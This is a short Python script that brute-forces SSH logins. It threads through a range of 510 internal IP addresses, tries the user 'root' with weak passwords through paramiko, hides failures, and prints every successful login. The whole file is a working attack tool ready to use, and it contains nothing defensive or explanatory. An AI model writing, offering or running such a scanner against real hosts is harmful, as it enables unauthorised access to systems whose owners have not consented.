import paramiko
import threading

# List of IP addresses to target (from 10.201.0.1 to 10.201.1.255)
ip_range = [f"10.201.0.{i}" for i in range(1, 256)] + [f"10.201.1.{i}" for i in range(1, 256)]

# Specify your list of usernames and passwords (example here)
usernames = ["root"]  # Replace with actual usernames
passwords = ["12345", "123"]  # Replace with actual passwords

# Function to attempt SSH login
def ssh_brute_force(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add the host key
        ssh.connect(ip, username=username, password=password, timeout=5)
        print(f"Success: {username}@{ip} with password {password}")  # Print only on successful login
        ssh.close()
    except paramiko.AuthenticationException:
        pass  # Ignore incorrect passwords
    except Exception as e:
        pass  # Ignore other errors

# Function to attempt brute force on an IP address
def attempt_brute_force(ip):
    for username in usernames:
        for password in passwords:
            ssh_brute_force(ip, username, password)

# Main brute force loop with threading
def brute_force():
    threads = []
    for ip in ip_range:
        t = threading.Thread(target=attempt_brute_force, args=(ip,))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

if __name__ == "__main__":
    brute_force()
